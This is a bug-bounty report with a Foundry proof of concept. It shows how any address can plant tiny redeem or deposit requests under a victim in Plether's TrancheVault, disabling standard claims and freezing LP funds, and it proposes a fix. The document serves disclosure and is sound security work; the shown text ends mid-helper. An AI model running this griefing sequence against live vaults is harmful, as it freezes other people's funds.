# \#99540 [SC-Low] Any address can be named as controller of a Senior or Junior LP request without its consent: a 1 share-wei redeem request disables the victim's standard `redeem`/`withdraw` claims, and 1 USDG deposit lots keep its wallet in cooldown

**Submitted on Nov 14th 2026 at 05:45:56 UTC by @jh42 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99540
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description


### Brief/Intro

`TrancheVault.requestRedeem` and `TrancheVault.requestDeposit` (both overloads) check the `owner` but never the `controller`, so any address can be named as the controller of a Senior or Junior LP request and the request is written into that address's own redeem or deposit queue without its consent. Every other function that touches a controller's state calls `_requireControllerAuth(controller)`; these are the only two where a stranger picks the controller. A planted 1 share-wei redeem request sits at the head of the victim's queue and makes its later funded exits fail in the standard `redeem` and `withdraw`, and clearing it starts a 1 hour cooldown on the whole balance. 1 USDG deposit lots queued under the victim each epoch restamp the cooldown of its whole wallet every time a lot is claimed.


### Who is affected

- Any LP that holds Senior or Junior shares and later requests an exit is affected by the redeem side. The attacker needs no relationship with the victim.
- Any LP wallet whose controller or operator claims deposit lots is affected by the deposit side. Operators are the documented ERC-7540 way to automate claims.
- Any controller contract that claims through the standard ERC-4626 / ERC-7540 methods (`redeem`, `withdraw`), the path `CANONICAL_ENTRYPOINTS.md` lists for claims, can have its funded exit stranded.
- The attacker pays one share-wei per victim for the redeem side (the PoC asserts that 2 share-wei are worth zero USDG atoms), and 1 USDG per epoch for the deposit side.
### Root cause

**1. `requestRedeem` authorizes the owner and never the controller.**

```solidity
// TrancheVault.sol:606-632 (condensed)
function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId) {
    if (controller == address(0) || owner == address(0)) { revert TrancheVault__ZeroAddress(); }
    if (shares == 0) { revert TrancheVault__WithdrawalTooSmall(); }
    if (block.timestamp < lastDepositTime[owner] + DEPOSIT_COOLDOWN) { revert TrancheVault__DepositCooldown(); }  // owner
    uint256 maxShares = maxRequestRedeem(owner);                                                                  // owner
    if (shares > maxShares) { revert TrancheVault__ExceededMaxRequestRedeem(owner, shares, maxShares); }
    _requireMinimumRedeemSize(shares, maxShares);
    if (msg.sender != owner && !isOperator[owner][msg.sender]) { _spendAllowance(owner, msg.sender, shares); }    // owner
    _transfer(owner, address(this), shares);
    requestId = _enqueueRedeemRequest(shares, controller);                                                        // controller: never checked
    emit RedeemRequest(controller, owner, requestId, msg.sender, shares);
}

// TrancheVault.sol:650-658: the sibling that moves shares into a redeem request does check the controller
function requestRedeemFromClaimableDeposit(uint256 depositRequestId, uint256 shares, address controller) external override returns (uint256 redeemRequestId) {
    if (controller == address(0)) { revert TrancheVault__ZeroAddress(); }
    _requireControllerAuth(controller);
```

**2. `requestDeposit` checks `owner` or operator and never the controller. The two-argument overload passes the caller as owner and any address as controller.**

```solidity
// TrancheVault.sol:562-575
function requestDeposit(uint256 assets, address receiver) external returns (uint256 requestId) {
    return _requestDeposit(assets, receiver, msg.sender);       // receiver becomes the controller
}
function requestDeposit(uint256 assets, address controller, address owner) public returns (uint256 requestId) {
    return _requestDeposit(assets, controller, owner);
}

// TrancheVault.sol:1574-1584 (_requireRequestDepositPreflight, called by _requestDeposit)
if (controller == address(0) || owner == address(0)) { revert TrancheVault__ZeroAddress(); }
if (msg.sender != owner && !isOperator[owner][msg.sender]) {   // owner or operator of the owner
    revert TrancheVault__NotControllerOrOperator();
}
// ... terminal wipe, trading, minimum amount and capacity checks follow; none involves the controller's consent

// TrancheVault.sol:577-604 (_requestDeposit): writes the lot into the controller's state
depositRequests[controller][requestId] ...; _appendControllerDeposit(controller, requestId); pendingDepositAssets[controller][requestId] += assets;
```

**3. The request becomes the controller's head, and the standard claims read only the head.**

```solidity
// TrancheVault.sol:1783-1797 (_appendControllerRedeem): the first request of a controller becomes its head
if (tail == 0) { controllerRedeemHead[controller] = requestId; } else { ... }

// TrancheVault.sol:998-1012 and 1299-1311
function withdraw(uint256 assets, address receiver, address controller) public override returns (uint256 shares) {
    return _claimWithdraw(controllerRedeemHead[controller], assets, receiver, controller);
}
function redeem(uint256 shares, address receiver, address controller) public override returns (uint256 assets) {
    return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}
function maxRedeem(address controller) public view override returns (uint256) {
    uint256 requestId = controllerRedeemHead[controller];
    return requestId == 0 ? 0 : claimableRedeemRequest(requestId, controller);
}   // maxWithdraw is the same with claimableRedeemAssets
```

**4. A zero-quote head is refunded by the pass but stays queued until the controller acknowledges it**

```solidity
// HousePool.sol:960-986 (condensed): a head that quotes zero is refunded, the pass counts it as progress
if (fullHeadAssets == 0) {
    ...
    if (vault.refundRedeemEpochRemainder(epochId, remainingShares) != remainingShares) { revert HousePool__VaultSettlementInvariant(); }
    ...
    phase.processedEpochs += 1;
    continue;
}

// TrancheVault.sol:1216-1227 (_maybeCloseRedeemPosition): the position leaves the queue only after refundClaimed
bool refundProcessed = !epoch.refundEnabled || position.refundClaimed;

// TrancheVault.sol:911 and :943: both dismissals stamp the cooldown on the receiver, which must be the controller
lastDepositTime[receiver] = block.timestamp;
```

**5. A claimed lot stamps the whole wallet, and the stamp blocks exits and transfers of every share the wallet holds.**

```solidity
// TrancheVault.sol:1099-1112 (_consumeDepositClaim)
if (shares != 0) {
    uint256 activationTime = depositEpochActivationTime[requestId];
    if (lastDepositTime[receiver] < activationTime) { lastDepositTime[receiver] = activationTime; }
    _transfer(address(this), receiver, shares);
}

// TrancheVault.sol:325-328 (_update) and 617-619 (requestRedeem): the stamp is wallet-wide
if (block.timestamp < lastDepositTime[from] + DEPOSIT_COOLDOWN) { revert TrancheVault__TransferDuringCooldown(); }
if (block.timestamp < lastDepositTime[owner] + DEPOSIT_COOLDOWN) { revert TrancheVault__DepositCooldown(); }
```

## Impact
- At least 24 hours (deposit side):
  - A Junior LP wallet worth 1,000,039.08 USDG is locked for 26 hours: `requestRedeem` reverts `TrancheVault__DepositCooldown` and `transfer` reverts `TrancheVault__TransferDuringCooldown` after every claim.
  - The attacker spends 26 USDG, one lot per epoch, and the cost does not grow with the size of the victim.
  - The lock ends one hour after the last stamp. The only gap per epoch is the time between the previous lock's expiry and the next claim (12 seconds of keeper latency in the PoC, asserted at each epoch).
  - The PoC alternates the two overloads: even epochs use `requestDeposit(assets, controller, owner)` and odd epochs use `requestDeposit(assets, receiver)`. Every lot reaches the victim's queue and every claim restamps the wallet.
- At least 1 hour (redeem side):
  - The plant disables `redeem`, `withdraw`, `maxRedeem` and `maxWithdraw` for a funded exit of 250,012.89 USDG. A control LP with the same kind of exit and no plant is paid by the standard `redeem`.
  - Clearing the plant with `claimRedeemRefund` stamps the whole remaining balance of 250,012.89 USDG: locked for exactly 3,600 seconds (asserted at 3,599 and 3,600).
  - One attacker plants under two victims in one epoch for 2 share-wei in total, and both funded exits are unreachable through the standard claims.
- Permanent freezing, for controller contracts:
  - A contract that claims through `redeem` and `withdraw` only has a funded exit of 200,010.31 USDG escrowed in the vault. Both methods revert after the settlement and after 365 simulated days, and the USDG never reaches the contract.

### User story

1. The pool runs release parameters with 1 USDG seeds. Alice deposits 500,000 USDG into Junior. A trader opens a 100,000 USDG long through `commitOrder` and `executeOrder`, so LP settlement uses a live mark.
2. An attacker holding LP shares waits out the 1 hour cooldown, sends 1 share-wei to a fresh address and calls `requestRedeem(1, ALICE, mule)` from it. Alice does nothing.
3. A keeper calls the Router's `settleLpEpoch`. The request quotes zero, is refunded and stays as Alice's head.
4. Alice requests an exit of half her shares. The next settlement funds 250,012.89 USDG.
5. `maxRedeem(ALICE)` and `maxWithdraw(ALICE)` are 0, and `redeem` and `withdraw` revert. Nobody but Alice can clear the head.
6. Alice calls `claimRedeemRefund`. The standard claims work again, and her remaining 250,012.89 USDG cannot be moved or requested for exactly one hour.
7. Separately, Bob holds 1,000,000 USDG of Junior and approved a claim bot as operator. Each epoch the attacker calls `requestDeposit(1e6, BOB, attacker)` or `requestDeposit(1e6, BOB)`, a keeper settles and the bot claims. Bob's wallet stays in cooldown for 26 hours.

### Recommendation

Require the controller's consent when the owner and the controller differ, as `requestRedeemFromClaimableDeposit` already does.

```diff
--- a/packages/perps/src/TrancheVault.sol
+++ b/packages/perps/src/TrancheVault.sol
@@ -614,6 +614,11 @@
         if (shares == 0) {
             revert TrancheVault__WithdrawalTooSmall();
         }
+        // A request enters the controller's FIFO and heads standard claims, so a third-party owner needs the
+        // controller's (or its operator's) consent, as in requestRedeemFromClaimableDeposit.
+        if (controller != owner) {
+            _requireControllerAuth(controller);
+        }
         if (block.timestamp < lastDepositTime[owner] + DEPOSIT_COOLDOWN) {
             revert TrancheVault__DepositCooldown();
         }
@@ -1582,6 +1587,11 @@
         if (msg.sender != owner && !isOperator[owner][msg.sender]) {
             revert TrancheVault__NotControllerOrOperator();
         }
+        // A lot queued under a controller that did not consent would otherwise be claimed through the controller's
+        // standard head path and restamp that wallet's whole-balance cooldown.
+        if (controller != owner && controller != msg.sender && !isOperator[controller][msg.sender]) {
+            revert TrancheVault__NotControllerOrOperator();
+        }
         if (_isTerminallyWiped()) {
             revert TrancheVault__TerminallyWiped();
         }
```

## References
- TrancheVault.sol, requestRedeem (owner checks, no controller check): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632
- TrancheVault.sol, requestRedeemFromClaimableDeposit (checks the controller): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L650-L658
- TrancheVault.sol, requestDeposit overloads and _requestDeposit: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L562-L604
- TrancheVault.sol, request preflight (owner check only): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1574-L1609
- TrancheVault.sol, _enqueueRedeemRequest: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L688-L708
- TrancheVault.sol, controller redeem head: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1783-L1797
- TrancheVault.sol, standard claims keyed to the head: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1012
- TrancheVault.sol, maxWithdraw and maxRedeem: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311
- TrancheVault.sol, cancelRedeemRequest and claimRedeemRefund (cooldown stamps): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L884-L947
- TrancheVault.sol, position stays queued until the refund is claimed: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1216-L1227
- TrancheVault.sol, deposit claim stamps the wallet: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1099-L1118
- TrancheVault.sol, cooldown on transfers: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L314-L335
- TrancheVault.sol, refundRedeemEpochRemainder removes the refunded epoch from the global queue: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1505-L1524
- HousePool.sol, zero-quote head is refunded as epoch progress: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L987
- IAsyncTrancheVault.sol, documented claim and cooldown rules: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IAsyncTrancheVault.sol#L8-L19
- CANONICAL_ENTRYPOINTS.md, LP entrypoints: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md?plain=1#L186-L212
- SECURITY.md, cooldown and LP claim limitations: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1396-L1399


## Proof of Concept


```bash
forge test --root packages/perps --match-path test/perps/TrancheControllerConsent.t.sol -vv
```
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// @dev An integrator that holds LP shares for its users and claims only through the standard ERC-4626 / ERC-7540
///      methods that CANONICAL_ENTRYPOINTS.md lists for claims (`deposit`, `redeem`, `withdraw`).
contract StandardClaimController {

    TrancheVault public immutable vault;
    IERC20 public immutable usdg;

    constructor(
        TrancheVault vault_,
        IERC20 usdg_
    ) {
        vault = vault_;
        usdg = usdg_;
    }

    function requestDeposit(
        uint256 assets
    ) external returns (uint256 id) {
        usdg.approve(address(vault), assets);
        id = vault.requestDeposit(assets, address(this), address(this));
    }

    function claimDeposit() external returns (uint256 shares) {
        shares = vault.deposit(vault.maxDeposit(address(this)), address(this), address(this));
    }

    function requestExit(
        uint256 shares
    ) external returns (uint256 id) {
        id = vault.requestRedeem(shares, address(this), address(this));
    }

    function exitByShares() external returns (uint256 assets) {
        assets = vault.redeem(vault.maxRedeem(address(this)), address(this), address(this));
    }

    function exitByAssets() external returns (uint256 shares) {
        shares = vault.withdraw(vault.maxWithdraw(address(this)), address(this), address(this));
    }

}

/// @dev Release risk parameters, release 1 USDG seeds. Every state change is a public call by an ordinary actor:
///      LP requests and claims, trader commitOrder/executeOrder, and the permissionless Router `settleLpEpoch`.
///      No storage writes, no pranks on protocol contracts. Only Pyth and USDG are mocks.
contract TrancheControllerConsentTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // LP that never agreed to anything
    address internal constant BOB = address(0xB0B); // LP whose claim bot (operator) claims its deposit lots
    address internal constant DAVE = address(0xDA7E); // control LP: same exit as Alice, nobody names him as controller
    address internal constant ATTACKER = address(0xBAD); // ordinary LP
    address internal constant MULE_ALICE = address(0xBAD0001); // fresh address that receives 1 share-wei
    address internal constant MULE_WRAPPER = address(0xBAD0002); // fresh address that receives 1 share-wei
    address internal constant CLAIM_BOT = address(0xB07B07); // operator Bob authorised to claim
    address internal constant KEEPER = address(0xCA401);
    address internal constant TRADER = address(0x7A0E2);

    uint256 internal constant LOT = 1e6; // MIN_TRANCHE_DEPOSIT_ASSETS, 1 USDG
    uint256 internal constant EPOCHS = 26;
    uint256 internal constant KEEPER_DELAY = 12;
    uint256 internal constant BOT_DELAY = 12;

    uint256 internal stagedPrice = 100_000_000;
    uint256 internal stagedTime = SETUP_TIMESTAMP;

    StandardClaimController internal wrapper;
    uint256 internal aliceShares;
    uint256 internal bobShares;
    uint256 internal daveShares;
    uint256 internal wrapperShares;
    uint256 internal wrapperOwed;
    uint256 internal wrapperExitId;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    /// @dev The shared harness differs from the release in four values. Align them through the owner's normal
    ///      72-hour proposal paths so the PoC runs on release parameters. The single wait ends on a Monday morning (UTC),
    ///      because the scenario below spans more than two days of LP epochs and the oracle market closes on Fridays.
    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.minOpenNotionalAssets = 1_000e6;
        routerConfig.adverseConfidenceMultiplierBps = 2_500;
        routerAdmin.proposeRouterConfig(routerConfig);
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        uint256 ready = _now() + 72 hours + 1;
        uint256 day = ready / 1 days; // day 0 of the Unix epoch was a Thursday
        uint256 monday = (day + ((7 - (day + 3) % 7) % 7)) * 1 days + 1 hours;
        vm.warp(monday < ready ? monday + 7 days : monday);
        routerAdmin.finalizeRouterConfig();
        pool.finalizePoolConfig();
    }

    // ------------------------------------------------------------------ the single test

    function test_ConsentGap_StrangerNamesVictimAsController() public {
        _assertReleaseParameters();
        _fundLps();
        _redeemSide();
        _depositSide();
        _controllerContractStaysStranded();
    }

    // ------------------------------------------------------------------ 0. honest LPs and a live position

    function _assertReleaseParameters() internal view {
        assertEq(router.minOpenNotionalAssets(), 1_000e6, "release minOpenNotionalAssets");
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2_500, "release confidence multiplier");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release confidence ratio");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(router.maxPendingOrders(), 5, "release maxPendingOrders");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior exposure cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share cap");
        assertEq(pool.MIN_TRANCHE_DEPOSIT_ASSETS(), 1e6, "release minimum tranche deposit");
        assertEq(juniorVault.DEPOSIT_COOLDOWN(), 1 hours);
    }

    /// @dev Alice, Dave, Bob, a controller contract and the attacker all deposit into Junior in one epoch. A trader then
    ///      opens a position, so every later LP settlement needs a live mark through the Router.
    function _fundLps() internal {
        wrapper = new StandardClaimController(juniorVault, IERC20(address(settlementToken)));
        settlementToken.mint(address(wrapper), 200_000e6);
        uint256 id = wrapper.requestDeposit(200_000e6);
        _requestDep(juniorVault, ALICE, 500_000e6);
        _requestDep(juniorVault, DAVE, 100_000e6);
        _requestDep(juniorVault, BOB, 1_000_000e6);
        _requestDep(juniorVault, ATTACKER, 5e6);
        _settleNoPosition(id);
        wrapperShares = wrapper.claimDeposit();
        aliceShares = _claimDep(juniorVault, id, ALICE);
        daveShares = _claimDep(juniorVault, id, DAVE);
        bobShares = _claimDep(juniorVault, id, BOB);
        _claimDep(juniorVault, id, ATTACKER);
        vm.prank(BOB);
        juniorVault.setOperator(CLAIM_BOT, true);

        _fundTrader(TRADER, 50_000e6);
        _setBasket(0);
        router.updateMarkPrice(_updateData());
        vm.prank(TRADER);
        router.commitOrder(CfdTypes.Side.LONG, 100_000e18, 20_000e6, 1e8, false);
        router.executeOrder(1, _mockPythUpdateData());
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, 100_000e18, "trader position is open");
        _wait(1 hours + 1);
        assertEq(juniorVault.maxRequestRedeem(ALICE), aliceShares, "everyone can exit freely before the attack");
    }

    // ------------------------------------------------------------------ 1. requestRedeem: the controller never consents

    function _redeemSide() internal {
        // The sibling entrypoint and every claim path check the controller; requestRedeem does not.
        vm.prank(MULE_ALICE);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        juniorVault.requestRedeemFromClaimableDeposit(1, 1, ALICE);

        // The attacker hands 1 share-wei to a fresh address per victim, which names the victim as controller.
        uint256 attackerBefore = juniorVault.balanceOf(ATTACKER);
        uint256 planted = _plant(MULE_ALICE, ALICE);
        assertEq(_plant(MULE_WRAPPER, address(wrapper)), planted, "both plants sit in the same epoch");
        assertEq(attackerBefore - juniorVault.balanceOf(ATTACKER), 2, "the attacker spent 2 share-wei");
        assertEq(juniorVault.estimateRedeemAssets(2), 0, "2 share-wei are worth zero USDG atoms");
        assertEq(juniorVault.controllerRedeemHead(ALICE), planted, "planted request heads Alice's queue");
        assertEq(juniorVault.pendingRedeemRequest(planted, ALICE), 1, "Alice owns a request she never made");

        // The keeper settles the epoch. The 1 share-wei quotes zero assets and is refunded, but the position stays.
        _settleLiveAt(planted, 1);
        assertTrue(juniorVault.redeemRefundPending(planted, ALICE), "refund waits for Alice");
        assertEq(juniorVault.controllerRedeemHead(ALICE), planted, "head stays until Alice acknowledges it");

        // Alice, Dave and the controller contract make an ordinary exit request each. The next settlement funds all three.
        vm.prank(ALICE);
        uint256 exitId = juniorVault.requestRedeem(aliceShares / 2, ALICE, ALICE);
        vm.prank(DAVE);
        juniorVault.requestRedeem(daveShares / 2, DAVE, DAVE);
        wrapperExitId = wrapper.requestExit(wrapperShares);
        assertEq(wrapperExitId, exitId);
        _settleLiveAt(exitId, 2);

        // Control: Dave has the same kind of exit and nobody planted anything. The standard claim pays it.
        uint256 daveClaimable = juniorVault.maxRedeem(DAVE);
        uint256 daveBefore = settlementToken.balanceOf(DAVE);
        assertGt(daveClaimable, 0, "control: the standard surface sees Dave's exit");
        vm.prank(DAVE);
        juniorVault.redeem(daveClaimable, DAVE, DAVE);
        assertGt(settlementToken.balanceOf(DAVE) - daveBefore, 49_000e6, "control: standard redeem pays");

        // Alice's exit is funded in full and escrowed in the vault, but the standard surface is keyed to the head.
        uint256 owed = juniorVault.claimableRedeemAssets(exitId, ALICE);
        emit log_named_decimal_uint("Alice funded exit, standard claims dead (USDG)", owed, 6);
        assertGt(owed, 249_000e6, "about 250k USDG is funded");
        assertEq(juniorVault.maxRedeem(ALICE), 0, "maxRedeem");
        assertEq(juniorVault.maxWithdraw(ALICE), 0, "maxWithdraw");
        vm.prank(ALICE);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, ALICE, uint256(1), 0));
        juniorVault.redeem(1, ALICE, ALICE);
        vm.prank(ALICE);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, ALICE, uint256(1), 0));
        juniorVault.withdraw(1, ALICE, ALICE);

        // Nobody but Alice can clear the head, and a day later it is still there.
        vm.prank(MULE_ALICE);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        juniorVault.claimRedeemRefund(planted, MULE_ALICE, ALICE);
        _wait(1 days);
        assertEq(juniorVault.maxRedeem(ALICE), 0, "still dead a day later");

        // The controller contract only knows the standard methods and has no way to clear the head.
        wrapperOwed = juniorVault.claimableRedeemAssets(exitId, address(wrapper));
        emit log_named_decimal_uint("controller contract funded exit (USDG)", wrapperOwed, 6);
        assertGt(wrapperOwed, 199_000e6, "funded and escrowed");
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, address(wrapper), 0, 0));
        wrapper.exitByShares();
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, address(wrapper), 0, 0));
        wrapper.exitByAssets();

        // Alice clears the head with claimRedeemRefund. The standard claims work again, and the acknowledgement
        // stamps the cooldown on her whole remaining balance.
        uint256 remaining = juniorVault.balanceOf(ALICE);
        emit log_named_decimal_uint("Alice balance left after the exit (USDG)", juniorVault.estimateRedeemAssets(remaining), 6);
        uint256 t0 = _now();
        vm.prank(ALICE);
        juniorVault.claimRedeemRefund(planted, ALICE, ALICE);
        assertEq(juniorVault.lastDepositTime(ALICE), t0, "acknowledging the refund stamps the whole wallet");
        assertEq(juniorVault.maxRedeem(ALICE), juniorVault.claimableRedeemRequest(exitId, ALICE), "head advances");
        vm.prank(ALICE);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(remaining, ALICE, ALICE);
        vm.prank(ALICE);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(address(0xCAFE), remaining);
        _wait(1 hours - 1);
        assertEq(juniorVault.maxRequestRedeem(ALICE), 0, "still locked one second before the hour");
        _wait(1);
        assertEq(juniorVault.maxRequestRedeem(ALICE), remaining + 1, "free after exactly one hour (balance + refunded wei)");
    }

    // ------------------------------------------------------------------ 2. requestDeposit: the controller never consents

    /// @dev One 1 USDG lot per epoch under Bob as controller, alternating between the three-argument overload and the
    ///      two-argument overload. Bob's claim bot claims the head lot each epoch with the standard `deposit`.
    function _depositSide() internal {
        assertEq(juniorVault.maxRequestRedeem(BOB), bobShares, "Bob can exit before the first lot");
        uint256 firstStamp;
        uint256 lastStamp;
        uint256 gifted;

        for (uint256 k; k < EPOCHS; ++k) {
            uint256 reqEpoch = pool.currentLpEpoch() + 1;
            uint256 target = pool.lpEpochStart(reqEpoch) - 10 minutes;
            if (target > _now()) {
                vm.warp(target);
            }
            uint256 id = _fundLot(k);
            assertEq(id, reqEpoch);
            assertEq(juniorVault.controllerDepositHead(BOB), id, "the lot heads Bob's deposit queue");
            vm.warp(pool.lpEpochStart(id) + KEEPER_DELAY);
            if (k > 0) {
                assertGt(juniorVault.maxRequestRedeem(BOB), 0, "open between the lock's expiry and the next claim");
            }
            _settleLive(k);
            uint256 activation = juniorVault.depositEpochActivationTime(id);
            _wait(BOT_DELAY);
            uint256 claimable = juniorVault.maxDeposit(BOB);
            vm.prank(CLAIM_BOT);
            gifted += juniorVault.deposit(claimable, BOB, BOB);
            assertEq(juniorVault.lastDepositTime(BOB), activation, "the claim stamps the whole wallet");
            assertEq(juniorVault.maxRequestRedeem(BOB), 0, "locked after the claim");
            vm.prank(BOB);
            vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
            juniorVault.requestRedeem(bobShares, BOB, BOB);
            vm.prank(BOB);
            vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
            juniorVault.transfer(address(0xDEAD), 1);
            _wait(30 minutes);
            assertEq(juniorVault.maxRequestRedeem(BOB), 0, "locked half an hour later");
            if (k == 0) {
                firstStamp = activation;
            }
            lastStamp = activation;
        }

        uint256 frozenUntil = lastStamp + juniorVault.DEPOSIT_COOLDOWN();
        emit log_named_decimal_uint("attacker spend (USDG)", EPOCHS * LOT, 6);
        emit log_named_decimal_uint("Bob wallet locked, in USDG", juniorVault.estimateRedeemAssets(juniorVault.balanceOf(BOB)), 6);
        emit log_named_uint("hours from first stamp to last expiry", (frozenUntil - firstStamp) / 1 hours);
        assertGe(frozenUntil - firstStamp, 24 hours, "locked for more than 24 hours");
        assertEq(settlementToken.balanceOf(ATTACKER), 0, "the attacker paid 1 USDG per epoch and nothing else");

        // The lock ends one hour after the last stamp; the full balance, including the gifted shares, can then exit.
        vm.warp(frozenUntil - 1);
        assertEq(juniorVault.maxRequestRedeem(BOB), 0);
        vm.warp(frozenUntil);
        assertEq(juniorVault.maxRequestRedeem(BOB), bobShares + gifted);
    }

    // ------------------------------------------------------------------ 3. the controller contract, a year later

    function _controllerContractStaysStranded() internal {
        _wait(365 days);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, address(wrapper), 0, 0));
        wrapper.exitByShares();
        assertEq(settlementToken.balanceOf(address(wrapper)), 0, "USDG never reaches the controller contract");
        assertEq(juniorVault.claimableRedeemAssets(wrapperExitId, address(wrapper)), wrapperOwed, "still owed after 365 days");
    }

    // ------------------------------------------------------------------ helpers

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _wait(
        uint256 secs
    ) internal {
        vm.warp(_now() + secs);
    }

    /// @dev Basket mark moving a few bps from epoch to epoch.
    function _px(
        uint256 k
    ) internal pure returns (uint256) {
        return 100_000_000 + ((k * 37) % 41) * 5_000 - 100_000;
    }

    function _setBasket(
        uint256 k
    ) internal {
        stagedPrice = _px(k);
        stagedTime = _now();
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(stagedPrice)), 0, int32(-8), stagedTime);
    }

    function _updateData() internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(stagedPrice)), 0, -8, stagedTime, 0));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    /// @dev Any address can call the Router's public LP settlement entrypoint.
    function _settleLive(
        uint256 k
    ) internal {
        _setBasket(k);
        vm.prank(KEEPER);
        router.settleLpEpoch(_updateData());
    }

    function _settleLiveAt(
        uint256 epochId,
        uint256 k
    ) internal {
        uint256 start = pool.lpEpochStart(epochId);
        if (_now() < start) {
            vm.warp(start);
        }
        _settleLive(k);
    }

    function _requestDep(
